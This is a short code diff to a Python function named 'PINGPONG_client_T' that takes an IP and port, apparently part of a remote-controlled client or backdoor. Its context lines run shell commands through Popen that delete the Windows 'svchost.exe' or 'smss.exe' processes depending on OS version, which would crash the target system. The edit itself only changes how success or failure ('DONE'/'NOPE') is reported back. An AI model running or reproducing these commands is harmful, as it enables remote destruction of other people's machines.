@@ -112,10 +112,7 @@ def PINGPONG_client_T(ip, port):
                     cmd = Popen("wmic process where name='svchost.exe' delete", shell=True, stdout=PIPE, stderr=PIPE)
                 elif version <= 7:
                     cmd = Popen("wmic process where name='smss.exe' delete", shell=True, stdout=PIPE, stderr=PIPE)
-                    cmd_print_out = cmd.stdout.read()
-                if not cmd_print_out:
-                    cmd_print_out = cmd.stderr.read()
-                if cmd_print_out:
+                if cmd.stderr.read():
                     cmd_print_out = 'NOPE'
                 else:
                     cmd_print_out = 'DONE'
